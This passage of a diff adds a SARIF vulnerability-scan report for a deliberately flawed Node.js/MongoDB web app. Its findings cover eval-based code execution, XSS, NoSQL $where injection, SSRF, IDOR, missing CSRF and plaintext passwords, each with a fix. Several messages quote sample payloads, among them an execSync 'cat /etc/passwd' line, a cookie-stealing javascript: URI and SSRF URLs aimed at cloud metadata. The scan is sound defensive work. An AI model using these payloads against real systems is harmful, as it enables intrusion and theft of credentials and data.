+                  "endLine": 459
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "9eea8238306ed60858a2e255221bbfef7d7b89abca6432890e4a92a0055f8ab1"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "REDOS",
+          "ruleIndex": 10,
+          "level": "error",
+          "message": {
+            "text": "The regex /([0-9]+)+\\#/ contains nested quantifiers causing catastrophic backtracking. Input like '0000000000000000000000000000!' triggers exponential evaluation time, causing denial of service. Fix: change to /([0-9]+)\\#/ by removing the outer '+'."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 292,
+                  "startColumn": 31,
+                  "endLine": 292
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1c27fbf170b5b331a469e4fb58f1bd901313ff76f57f643b2a4cbc39a2267aad"
+          },
+          "properties": {
+            "confidence": 0.98
+          }
+        },
+        {
+          "ruleId": "INCORRECT-OUTPUT-ENCODING",
+          "ruleIndex": 11,
+          "level": "error",
+          "message": {
+            "text": "ESAPI.encoder().encodeForHTML() is applied to doc.website, but the value is used in an href attribute (URL context). HTML encoding does not block javascript: or data: URI schemes. An attacker can set their website to 'javascript:alert(document.cookie)' which will pass HTML encoding but execute as XSS when clicked. Use encodeForURL() instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 261,
+                  "startColumn": 13,
+                  "endLine": 261
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "87a981090ffa3a28e4f870e2fc22f8f620de85f900d1625391fc79642470b11f"
+          },
+          "properties": {
+            "confidence": 0.92
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 12,
+          "level": "error",
+          "message": {
+            "text": "User-supplied firstName is stored without sanitization and rendered directly in Swig template with autoescape disabled (line 298). When bank routing validation fails, the raw firstName value is passed to res.render as firstNameSafeString without encoding. On successful update, all user fields are spread into the template without encoding."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 297,
+                  "startColumn": 13,
+                  "endLine": 309
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ffc9a9272defb4049e5a1994bf04c6ed2226208f4c1808186f465266dfe8f977"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MASS-ASSIGNMENT",
+          "ruleIndex": 13,
+          "level": "warning",
+          "message": {
+            "text": "Profile fields from req.body are passed to MongoDB $set without type checking or length validation. Since body-parser can parse nested objects, an attacker can submit structured objects (e.g., firstName[$gt]='') for NoSQL operator injection, or extremely long strings for storage DoS."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/profile-dao.js"
+                },
+                "region": {
+                  "startLine": 391,
+                  "startColumn": 5,
+                  "endLine": 441
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "6b1d439b1234ab5eb5a19dca1e4b59be9fbd424ed0d0632266b4ae04f975d3de"
+          },
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "XSS-CONTEXT",
+          "ruleIndex": 14,
+          "level": "warning",
+          "message": {
+            "text": "The website field is encoded with ESAPI encodeForHTML() but used in a URL href attribute context. This encoding mismatch means javascript: protocol URIs and data: URIs are not neutralized by HTML entity encoding, allowing script execution when a user clicks the link."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 261,
+                  "startColumn": 28,
+                  "endColumn": 67
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8028269f650ab042d6a10126be496294bd2056be64ef847918275ab97f4e1e8e"
+          },
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "STORED-XSS-001",
+          "ruleIndex": 15,
+          "level": "error",
+          "message": {
+            "text": "Stored XSS: req.body.memo is inserted into MongoDB without sanitization via addMemos(). When displayMemos renders stored memos with swig autoescape disabled, injected scripts execute in victim browsers. Insert DOMPurify.sanitize() or equivalent before storage, and enable swig autoescape."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "17d27fc960a92e39b3d1453a4b1348081f4a6f549d8e689c303b386d2a213e61"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-DEPENDENCY-001",
+          "ruleIndex": 16,
+          "level": "error",
+          "message": {
+            "text": "Vulnerable dependency: marked 0.3.5 has multiple known XSS vulnerabilities (CVE-2016-10531, CVE-2017-1000427). The sanitize option is deprecated and does not prevent all XSS vectors. Upgrade to marked >=4.0.0 and use DOMPurify for output sanitization."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "d1950e6e0d46d42e166437cbdd3998a221e70f0aa1fbefffc5513f1944808adb"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "INPUT-VALIDATION-001",
+          "ruleIndex": 17,
+          "level": "error",
+          "message": {
+            "text": "Missing input validation: POST /memos accepts arbitrary content in req.body.memo with no length limit, format validation, or character filtering. Apply allowlist-based validation and enforce a maximum length to limit abuse surface."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "cdb9aec18ee61f46d32aa733b811cbade0c292c919bd1683c74ca7e766dd19a7"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "CSRF-001",
+          "ruleIndex": 18,
+          "level": "error",
+          "message": {
+            "text": "Missing CSRF protection: the csrf middleware on POST /memos is commented out. An attacker can forge cross-origin requests to create memos containing XSS payloads on behalf of authenticated users. Re-enable csurf middleware or implement SameSite cookie + custom header validation."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "dd07d1166f09d92d0f0645acb71a43092df2a3ec223d34491a7e92abb297575b"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "NOSQL-INJECTION-001",
+          "ruleIndex": 19,
+          "level": "warning",
+          "message": {
+            "text": "Potential NoSQL injection: req.body.memo is passed directly to memosDAO.insert without type checking. If the application parses JSON request bodies, an attacker can send an object with MongoDB operators (e.g., {\"$gt\": \"\"}) instead of a string. Validate that memo is a string before insertion."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/memos-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "82e0577e36dc9cf6b4b1253eada171c0304b48fb5aeeafa8851bf0de8b857a1d"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "BROKEN-ACCESS-CONTROL-001",
+          "ruleIndex": 20,
+          "level": "error",
+          "message": {
+            "text": "The displayMemos function in memos-dao.js retrieves all memos from the database without filtering by the current user's ID. All authenticated users can view all memos regardless of ownership, constituting horizontal privilege escalation and information disclosure."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/memos-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "156565b5eaf67e236e857606f774376ff1e044f20ead0de35f715bd62e540bc1"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "OUTPUT-ENCODING-001",
+          "ruleIndex": 21,
+          "level": "error",
+          "message": {
+            "text": "The memosList fetched from the database is passed directly to the Swig template rendering call without any HTML encoding, sanitization, or content security filtering. This is the root cause enabling stored XSS through memo content."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "b7671a4bd8b3fc2be7f12926eb90640f0ba46b5097bd40a49845c0a469bd774f"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SSJS-001",
+          "ruleIndex": 22,
+          "level": "error",
+          "message": {
+            "text": "eval(req.body.preTax) executes user-controlled input as JavaScript on the server, enabling Remote Code Execution. An attacker can execute arbitrary OS commands (e.g., require('child_process').execSync('cat /etc/passwd')). Replace eval() with parseInt() or Number()."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 32,
+                  "startColumn": 26,
+                  "endColumn": 48
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "089609b38124d39958d69cf4c32abc2a71071e8df8bf1b87f55ae68372659489"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SSJS-002",
+          "ruleIndex": 23,
+          "level": "error",
+          "message": {
+            "text": "eval(req.body.afterTax) executes user-controlled input as JavaScript on the server, enabling Remote Code Execution. Replace eval() with parseInt() or Number()."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 33,
+                  "startColumn": 27,
+                  "endColumn": 50
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "33da868d3a10d175abe1abc543b24ab7b2aa0b34dcc16f2feb7925cf372e33e4"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SSJS-003",
+          "ruleIndex": 24,
+          "level": "error",
+          "message": {
+            "text": "eval(req.body.roth) executes user-controlled input as JavaScript on the server, enabling Remote Code Execution. Replace eval() with parseInt() or Number()."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 34,
+                  "startColumn": 22,
+                  "endColumn": 42
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "452e4fe2fdacd7e917c2f37d2161afe8e11cd498e83f7cc9d99b03d23b50bb03"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VALIDATE-AFTER-EXEC-001",
+          "ruleIndex": 25,
+          "level": "warning",
+          "message": {
+            "text": "Validation via isNaN() and range checks on line 47 occurs after eval() has already executed attacker code on lines 32-34. The validation provides no security benefit because malicious payloads execute before any check runs. Move validation (and switch to parseInt/Number) before processing input."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 47,
+                  "startColumn": 9,
+                  "endLine": 48
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f33d92dbe666ba66cad45a413b337aef639f6ad1632d4da08ed5ec3e514c245e"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "CSRF-001",
+          "ruleIndex": 18,
+          "level": "warning",
+          "message": {
+            "text": "The handleContributionsUpdate handler modifies contribution data in MongoDB without CSRF token validation. Combined with the eval() vulnerability, this allows a drive-by attack where visiting a malicious page triggers RCE on the server under the victim's session."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 5,
+                  "endLine": 76
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "45d71f36042d04a0aba6563d3bb7c86601cb249586c416710b20dd6ecf3fd4ee"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "VULN-008-001",
+          "ruleIndex": 26,
+          "level": "error",
+          "message": {
+            "text": "eval() is called with user-controlled input req.body.preTax, req.body.afterTax, and req.body.roth on lines 32-34. An attacker can submit arbitrary JavaScript (e.g., 'process.mainModule.require(\"child_process\").execSync(\"id\")') as a contribution value to achieve full remote code execution on the server."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 32,
+                  "startColumn": 27,
+                  "endLine": 32,
+                  "endColumn": 51
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 33,
+                  "startColumn": 28,
+                  "endLine": 33,
+                  "endColumn": 53
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 34,
+                  "startColumn": 24,
+                  "endLine": 34,
+                  "endColumn": 45
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "01d44214d8722f5fcfa591080e5939366c6086dcd551593933d496d0dc397a17"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-008-002",
+          "ruleIndex": 27,
+          "level": "error",
+          "message": {
+            "text": "Business logic validation (NaN check on line 47, 30% cap on line 57) executes after eval() on lines 32-34. The injected code runs unconditionally before any validation. Even rejected inputs achieve code execution."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 32,
+                  "startColumn": 9,
+                  "endLine": 34,
+                  "endColumn": 46
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "9ba88cdb06949815374578055ef1945ff7500c2408d27582dbbd5eff69a0174a"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-008-003",
+          "ruleIndex": 28,
+          "level": "error",
+          "message": {
+            "text": "No input type validation, sanitization, or allowlist filtering is applied to req.body.preTax, req.body.afterTax, or req.body.roth before they are passed to eval(). The safe alternative (parseInt on lines 38-40) is commented out."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 5,
+                  "endLine": 34,
+                  "endColumn": 46
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "bc4133e949aeb33ca41dfa19a6a5260eaa9e000245bf8ecaaff2adbb4406e4b1"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-008-004",
+          "ruleIndex": 29,
+          "level": "warning",
+          "message": {
+            "text": "contributionsDB.update() on line 28 of contributions-dao.js uses upsert:true with contribution values that originated from eval() of user input. Combined with the RCE vulnerability, arbitrary values or object types could be persisted to MongoDB."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/contributions-dao.js"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 9,
+                  "endLine": 33,
+                  "endColumn": 14
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "cea90549c55a9de5467b3023fab6f08a1dfee1839e616e0440e7a0d54bba0fd0"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "VULN-008-005",
+          "ruleIndex": 30,
+          "level": "warning",
+          "message": {
+            "text": "The POST /contributions endpoint modifies user financial data without CSRF token validation. An attacker-controlled page can forge contribution update requests against authenticated users."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 5,
+                  "endLine": 76,
+                  "endColumn": 6
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ad009774f9433b059b46c8e18785108a32d3876ab28b000f714caf496195d845"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-008-006",
+          "ruleIndex": 31,
+          "level": "note",
+          "message": {
+            "text": "MongoDB update query on line 28-30 uses raw userId (string) in the filter but parseInt(userId) in the document body on line 18. This type mismatch with upsert:true may create duplicate contribution records instead of updating existing ones."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/contributions-dao.js"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 9,
+                  "endLine": 30,
+                  "endColumn": 14
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "2b88bf90550959bcd45210a3db174bf36ccdd95c53b63782aef700e28b633efd"
+          },
+          "properties": {
+            "confidence": 0.75
+          }
+        },
+        {
+          "ruleId": "NOSQLI-001",
+          "ruleIndex": 32,
+          "level": "error",
+          "message": {
+            "text": "The 'threshold' query parameter is string-interpolated directly into a MongoDB $where clause: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`. An attacker can inject JavaScript code (e.g., threshold=`1'; return 1 == '1`) to bypass query filters and access unauthorized data."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 78,
+                  "startColumn": 21,
+                  "endLine": 78,
+                  "endColumn": 87
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "4097240c1192fb2c36080379ed15a0a28bbc96e76f2958b34c44555025d4a662"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "NOSQLI-002",
+          "ruleIndex": 33,
+          "level": "error",
+          "message": {
+            "text": "The $where clause accepts arbitrary JavaScript from the 'threshold' parameter. An attacker can inject `0'; while(true){}; '` to cause an infinite loop inside MongoDB's JavaScript engine, resulting in denial of service."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 78,
+                  "startColumn": 21,
+                  "endLine": 78,
+                  "endColumn": 87
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "36830a85bc9f6c7821bce707d71e4f7e837164625ee0aeef2d3b59bc3c95fed4"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IDOR-001",
+          "ruleIndex": 34,
+          "level": "error",
+          "message": {
+            "text": "The displayAllocations handler extracts userId from req.params (URL path segment) at line 17 instead of from the authenticated session (req.session.userId). Any authenticated user can enumerate and access other users' allocation data by modifying the userId in the request URL."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/allocations.js"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 15,
+                  "endLine": 18,
+                  "endColumn": 10
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "0229dd7bdf89d7be46625430840c38d930c1c52b0b5d451ea0f17212fba84136"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MISSING-FUNCTION-LEVEL-ACCESS-CONTROL",
+          "ruleIndex": 35,
+          "level": "error",
+          "message": {
+            "text": "The GET /benefits route is registered with only isLoggedIn middleware: app.get('/benefits', isLoggedIn, benefitsHandler.displayBenefits). The isAdmin middleware is commented out and not enforced, allowing any authenticated user to access admin-only benefits management. Fix: add the isAdmin middleware to the route chain: app.get('/benefits', isLoggedIn, isAdmin, benefitsHandler.displayBenefits)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 30
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "95915a8358b159d6b4760576ad00f0ad22b9bcf403d3a323b623e7ce99c81644"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MASS-DATA-EXPOSURE",
+          "ruleIndex": 36,
+          "level": "error",
+          "message": {
+            "text": "The displayBenefits handler invokes benefitDAO.getAllNonAdminUsers() which returns benefit data for every non-admin user in the system. Because the route lacks admin authorization, any logged-in user can retrieve all other users' benefit details (start dates, salary, tax information). Fix: enforce isAdmin middleware on the route and consider returning only the requesting user's data for non-admin users."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/benefits-dao.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 30
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "afcb143ce1af2ed6a4453e45fdeba47f473420b394ad24543a830cca0550bcd5"
+          },
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "HARDCODED-ADMIN-FLAG",
+          "ruleIndex": 37,
+          "level": "warning",
+          "message": {
+            "text": "The benefits route handler passes hardcoded { isAdmin: true } in the response template data regardless of the actual user's role. This causes the client-side template to render admin controls for all users, and masks the missing server-side authorization check. Fix: derive the isAdmin flag from the authenticated user's session or database record: { isAdmin: req.session.isAdmin || false }."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/benefits.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 25
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "a8c39558ea0d17a9d6e7a171d2490e42a09e3d1fbd6437216290e69663b73514"
+          },
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "PRIV-ESCALATION-001",
+          "ruleIndex": 38,
+          "level": "error",
+          "message": {
+            "text": "POST /benefits route uses isLoggedIn middleware but omits isAdmin check. Any authenticated user can call updateBenefits to modify benefit records, which should be an admin-only operation. Add isAdmin middleware: app.post('/benefits', isLoggedIn, isAdmin, benefitsHandler.updateBenefits)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f2f8ac5b1083ec14e8e9a37e589a5f4484dd2b18ba98c5dad1ef9e9dc9668556"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "IDOR-001",
+          "ruleIndex": 34,
+          "level": "error",
+          "message": {
+            "text": "updateBenefits handler reads userId from req.body and passes it to benefitsDAO.updateBenefits(parseInt(userId), ...) without verifying the authenticated user owns that userId. An attacker can set userId to any value in the POST body to modify another user's benefits (horizontal privilege escalation). The userId should be derived from the authenticated session, not from user-supplied input."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/benefits.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/benefits-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f071d71c9bca59dac15327b35ef2425e2822e9d4afb0eaa5ca7fda50bcbc86f2"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "CSRF-001",
+          "ruleIndex": 18,
+          "level": "error",
+          "message": {
+            "text": "The POST /benefits endpoint modifies user benefit data but lacks CSRF token validation. The CSRF middleware is commented out in the application, so no state-changing endpoints are protected. An attacker can craft a malicious page that submits a forged POST request to /benefits while the victim is authenticated, silently modifying benefit records."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "315bc7f4d15a117ae6bffe1f7342d0f741a50563ab04ced524bbe39aecd87448"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "AUTH-BYPASS-001",
+          "ruleIndex": 39,
+          "level": "error",
+          "message": {
+            "text": "The entire benefits modification flow (route → handler → DAO) lacks authorization checks. Authentication via isLoggedIn confirms the user's identity but never verifies they are permitted to perform benefit modifications. This missing authorization, combined with the user-controlled userId parameter, creates a compound vulnerability allowing any authenticated user to modify any other user's benefits."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/benefits.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/benefits-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "bc180994aeb70b934f52546ee411e98cc2decee4d640c491171ac43e5405d2dc"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "SSRF",
+          "ruleIndex": 40,
+          "level": "error",
+          "message": {
+            "text": "Full SSRF: needle.get() is called with a URL constructed entirely from user-controlled query parameters (req.query.url + req.query.symbol). An attacker can set url=http://169.254.169.254/latest/meta-data/&symbol= to access AWS metadata, or url=http://localhost:27017/&symbol= to probe internal MongoDB. No URL validation, allowlist, or blocklist is applied."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/research.js"
+                },
+                "region": {
+                  "startLine": 249,
+                  "startColumn": 20,
+                  "endLine": 249,
+                  "snippet": {
+                    "text": "return needle.get(url, (error, newResponse, body) => {"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ff0467df91f6e0266438f0b9b314201dbbe1e4336ab3afb68fe72ea927076ec5"
+          },
+          "properties": {
+            "confidence": 0.99
+          }
+        },
+        {
+          "ruleId": "XSS-REFLECTED",
+          "ruleIndex": 41,
+          "level": "error",
+          "message": {
+            "text": "Reflected XSS: the response body from the SSRF-fetched URL is written directly to the HTTP response with Content-Type text/html and no output encoding. An attacker can host a page containing malicious JavaScript at the URL they control, and the script will execute in the victim's browser in the context of the application's origin."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/research.js"
+                },
+                "region": {
+                  "startLine": 258,
+                  "startColumn": 21,
+                  "endLine": 258,
+                  "snippet": {
+                    "text": "res.write(body);"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "a8de17d1740c8706ea1d6c16de2fc7e0e257f0ad262287e02ef242361ab2345d"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "INPUT-VALIDATION",
+          "ruleIndex": 42,
+          "level": "error",
+          "message": {
+            "text": "No input validation on req.query.url: the parameter is used directly in URL construction without checking the scheme (allowing file://, gopher://, dict://), host (allowing 127.0.0.1, 169.254.169.254, internal hostnames), or applying any allowlist. This enables SSRF attacks against internal infrastructure."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/research.js"
+                },
+                "region": {
+                  "startLine": 247,
+                  "startColumn": 9,
+                  "endLine": 249,
+                  "snippet": {
+                    "text": "if (req.query.symbol) {\n            const url = req.query.url + req.query.symbol;\n            return needle.get(url, (error, newResponse, body) => {"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c01112798fbe85814fe5ccca3af5abb9e423837f1e4a3372c8a055b47c5ebf84"
+          },
+          "properties": {
+            "confidence": 0.99
+          }
+        },
+        {
+          "ruleId": "VULN-013-001",
+          "ruleIndex": 43,
+          "level": "error",
+          "message": {
+            "text": "Passwords are stored in plaintext in the MongoDB users collection. The bcrypt hashing code in user-dao.js has been commented out, so passwords passed during user registration are written directly to the database without any cryptographic transformation. This allows mass credential theft if the database is compromised."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "0a7bc0c30f08efd6751c1b4ec0d730c06f57f7bf1c27506e8667671d32c21d3c"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-013-002",
+          "ruleIndex": 44,
+          "level": "error",
+          "message": {
+            "text": "Password authentication uses direct string comparison (===) against the plaintext stored password instead of bcrypt.compare() or an equivalent constant-time hash verification. This confirms the absence of password hashing and introduces a timing side-channel."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3a1d4cc0b979fddc0e978b9b3f24eb9ffa04bad77e59d435e02faf67d5e9eb49"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "VULN-013-003",
+          "ruleIndex": 45,
+          "level": "error",
+          "message": {
